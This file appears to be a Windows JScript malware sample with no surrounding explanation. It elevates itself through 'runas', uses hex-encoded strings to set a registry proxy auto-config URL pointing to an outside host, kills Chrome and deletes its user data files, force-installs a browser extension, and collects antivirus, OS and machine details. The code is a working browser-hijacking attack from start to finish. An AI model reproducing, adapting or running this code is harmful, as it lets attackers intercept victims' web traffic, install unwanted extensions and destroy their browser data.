var oReg = WScript.CreateObject("Wscript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var TEMPPATH = oReg.ExpandEnvironmentStrings("%TEMP%");
var APPPATH = oReg.ExpandEnvironmentStrings("%APPDATA%");
var LOCALAPPFOLDER = oReg.ExpandEnvironmentStrings("%LOCALAPPDATA%");
var PROGRAMFILES = oReg.expandEnvironmentStrings("%ProgramFiles%");
var PROGRAMFILES86 = oReg.expandEnvironmentStrings("%ProgramFiles(x86)%");

if (WScript.Arguments.Count() == 0 ) {
    var oShell = new ActiveXObject("Shell.Application");
    oShell.ShellExecute("wscript.exe", "\"" + WScript.ScriptFullName + "\"" + " /isElevated", WScript.ScriptFullName.slice(0,-WScript.ScriptName.length-1), "runas", 1);
	
	var objWMIService = GetObject("winmgmts:\\\\.\\root\\CIMV2");
	var processItems = objWMIService.ExecQuery("Select * from Win32_Process where Name=" + "\"" + "wscript.exe" + "\"");
	var gga = 0;
	for(var objEnum = new Enumerator(processItems); !objEnum.atEnd(); objEnum.moveNext()) {
			gga = gga + 1;
		}
		
	if (gga == 2){
		WScript.Quit();
	}
	
	oShell.ShellExecute("wscript.exe", "\"" + WScript.ScriptFullName + "\"" + "", "", "", 1);
}else{
	if (fso.FileExists(TEMPPATH + "\\nivv.txt")){
		WScript.Quit(1);
	} else {
		var shells = WScript.CreateObject("Wscript.Shell");
		var objFile = fso.CreateTextFile(TEMPPATH + "\\nivv.txt");
		objFile.Write("SYSCONT");
		
		shells.run("\x52\x45\x47\x2e\x45\x58\x45 ADD \"\x48\x4b\x45\x59\x5f\x43\x55\x52\x52\x45\x4e\x54\x5f\x55\x53\x45\x52\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v AutoConfigURL /d \"http://www.mysecretbook.site/chplay.dat\" /f");
		
		shells.run("ipconfig /flushdns");
		
		WScript.Sleep(2000);
		
		shells.run("taskkill.exe /f /t /im chrome.exe");
		
		WScript.Sleep(3000);
		
		
	
		if(fso.FolderExists(LOCALAPPFOLDER + "\\Google\\Chrome\\User Data")){
			var objFolder = fso.GetFolder(LOCALAPPFOLDER + "\\Google\\Chrome\\User Data");
		
			for(var objEnum = new Enumerator(objFolder.Files); !objEnum.atEnd(); objEnum.moveNext()) {
				fso.DeleteFile(objEnum.item(), true);
			}
		}
		
		fso.CreateFolder(APPPATH + "\\mani");
		
		WScript.Sleep(2000);
		
		var arrr = [];
		arrr[0] = "{";
		arrr[1] = "\"leeiaimbjhmbhpmgnibkalkedgimbfip\" : {";
		arrr[2] = "\"external_update_url\": \"https://clients2.google.com/service/update2/crx\"";
		arrr[3] = "}";
		arrr[4] = "}";
		
		var s = fso.CreateTextFile(APPPATH + "\\mani\\external_extensions.json", true);
		s.WriteLine(arrr[0]);
		s.WriteLine(arrr[1]);
		s.WriteLine(arrr[2]);
		s.WriteLine(arrr[3]);
		s.WriteLine(arrr[4]);
		s.Close(); 
		
		WScript.Sleep(2000);
		
		if (fso.FileExists(PROGRAMFILES + "\\Google\\Chrome\\Application\\chrome.exe")){
			var f = fso.GetFolder(PROGRAMFILES + "\\Google\\Chrome\\Application\\");
			var fc = f.SubFolders;
			for(var objEnum = new Enumerator(fc); !objEnum.atEnd(); objEnum.moveNext()) {
				var strFileName = "";
				strFileName += objEnum.item();
				if (strFileName.indexOf(".") != - 1){
					if (fso.FileExists(strFileName + "\\default_apps\\external_extensions.json")){
						fso.CopyFile(APPPATH + "\\mani\\external_extensions.json", strFileName + "\\default_apps\\", true);
					}
			}
			}
			
		}
		
		if (fso.FileExists(PROGRAMFILES86 + "\\Google\\Chrome\\Application\\chrome.exe")){
			var f = fso.GetFolder(PROGRAMFILES86 + "\\Google\\Chrome\\Application\\");
			var fc = f.SubFolders;
			for(var objEnum = new Enumerator(fc); !objEnum.atEnd(); objEnum.moveNext()) {
				var strFileNames = "";
				strFileNames += objEnum.item();
				if (strFileNames.indexOf(".") != - 1){
					if (fso.FileExists(strFileNames + "\\default_apps\\external_extensions.json")){
						fso.CopyFile(APPPATH + "\\mani\\external_extensions.json", strFileNames + "\\default_apps\\", true);
					}
			}
			}
			
		}
		try{
		var objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\SecurityCenter2");
		var colItems = objWMIService.ExecQuery("Select * from AntiVirusProduct");
		var enumItems = new Enumerator(colItems);
		var objItem = enumItems.item();
		var AVNAME = objItem.DisplayName;
		} catch(err) {}
		
		var wbemFlagReturnImmediately = 0x10;
		var wbemFlagForwardOnly = 0x20;
		var objWMIService = GetObject("winmgmts:\\\\.\\root\\CIMV2");
		var colItems = objWMIService.ExecQuery("SELECT * FROM Win32_OperatingSystem", "WQL", wbemFlagReturnImmediately | wbemFlagForwardOnly);
		var enumItems = new Enumerator(colItems);
		var objItem = enumItems.item();
		var OSVERSION = objItem.Caption;
	
		if (OSVERSION.indexOf("10") !=-1) {
			OSVERSION = "Windows 10";
		} else if (OSVERSION.indexOf("7") !=-1){
			OSVERSION = "Windows 7";
		} else if (OSVERSION.indexOf("8.1") !=-1){
			OSVERSION = "Windows 8.1";
		} else if (OSVERSION.indexOf("8") !=-1){
			OSVERSION = "Windows 8";
		} else if (OSVERSION.indexOf("XP") !=-1){
			OSVERSION = "Windows XP";
		}
		
		var ROLE = "Admin";
		var ARCH = GetObject("winmgmts:root\\cimv2:Win32_Processor='cpu0'").AddressWidth;;
		var PCNAME = oReg.ExpandEnvironmentStrings("%COMPUTERNAME%");
		
	
		
		WScript.Sleep(2000);
	}
}